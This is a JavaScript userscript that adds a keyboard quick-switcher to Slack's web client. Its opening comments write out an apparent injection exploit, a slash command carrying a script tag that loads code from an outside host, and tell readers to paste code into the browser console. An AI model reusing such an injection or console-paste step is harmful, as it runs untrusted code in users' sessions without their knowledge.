// there's currenly an exploit that allows this to be installed automatically:
// - go to a private room
// - paste this: /remove <script src="http://benvan.co.uk/slack-hack/slack-hack.js"/>Hackedy-hack-hack...

// That exploit will no doubt get patched very soon - so you can install the sad way :(

// to "install" - right click anywhere slack, select "inspect element"
// click "console" in the box that pops up. Down the bottom there's a wide text box with a little blue arrow in it
// copy all of this code - paste it into that text box, press enter.
// good to go! You can close the inspector window

(function go(){
    var isMac = window.navigator.platform.toLowerCase() == 'macintel';
    var cmdKey = isMac ? 'cmd' : 'ctrl';

    var width = 300;
    var container = $('<div></div>').css({
        position:'absolute',
        top:'35%',
        left:'50%',
        'margin-left':'-150px',
        width:width+'px',
        'font-size':'24pt',
        padding:'25px',
        border:'4px solid #ccc',
        'border-radius':'18px',
        'background-color':'white'
    }).hide();

    var box = $('<input type="text"/>').css({
        width:'100%'
    });
    var results = $('<div></div>').css({
        'font-size':'14pt',
        'max-height':'250px',
        'overflow-y':'scroll'
    });

    var vals = function(obj){ return Object.keys(obj).map(function(k){ return obj[k]; }) };

    var getTargets = function(){
        var searchTerm = box.val();
        var members = TS.members.getActiveMembers().map(function(m){ return {id:m.id,name:m.name,type:'member'}});
        var groups = vals(TS.groups.id_map).map(function(m){ return {id:m.id, name: m.name, type:'group'} });
        var channels = vals(TS.channels.id_map).map(function(m){ return {id:m.id, name:m.name, type:'channel'}});
        var all = members.concat(groups,channels);
        return all.filter(function(m){
            return m.name.match(new RegExp(searchTerm,"g"));
        });
    };

    var displayTargets = function(targets){
        results.empty().append(targets.map(function(target){
            return $("<div>"+ (target.type != 'member' ? '#' : '') +  target.name+"</div>").css('padding','2px');
        }));
        navigate(true);
    };

    var fallback = function(a,b){
        return a.length ? a : b;
    };

    var navigate = function(up){

        var target = results.find('div.selected');
        var next = target.length && target[up?'next':'prev']() || results.children()[up?'first':'last']();
        // yeah yeah, whatever.
        target.removeClass('selected')
        next.addClass('selected');

        results.children().css('background-color','white');
        results.find('.selected').css('background-color','#ddd');

    };

    var kill_it = function(){
        box.val('');
        container.hide();
        results.empty();
    };

    var go_go_go = function(){
        var i = results.find('.selected').index();
        var target = getTargets()[i];
        if (target.type == 'group') TS.groups.displayGroup(target.id)
        else if(target.type == 'member') TS.ims.startImByMemberId(target.id);
        else if (target.type == 'channel') TS.channels.displayChannel(target.id);

        kill_it();
    };

    container.append(box);
    container.append(results);

    box.on('input',function(ev){
        var targets = getTargets();
        displayTargets(targets);
    });

    box.on('keydown', function(ev){
        if (ev.keyCode == 38 || ev.keyCode == 40){
            navigate(ev.keyCode == 40);
            return false;
        } else if (ev.keyCode == 13) go_go_go();
    });



    $(document).keydown(function(ev){
        if (ev.keyCode == 27){
            kill_it();
        }else if (ev.keyCode == 75 && (ev.metaKey || ev.ctrlKey)){
            container.show();
            box.focus();
        }
    });

    $(document.body).append(container);

    TS.generic_dialog.div.find('.modal-body').html("<b>Success!<b/><p/> Invoke with "+cmdKey+"-k");

})();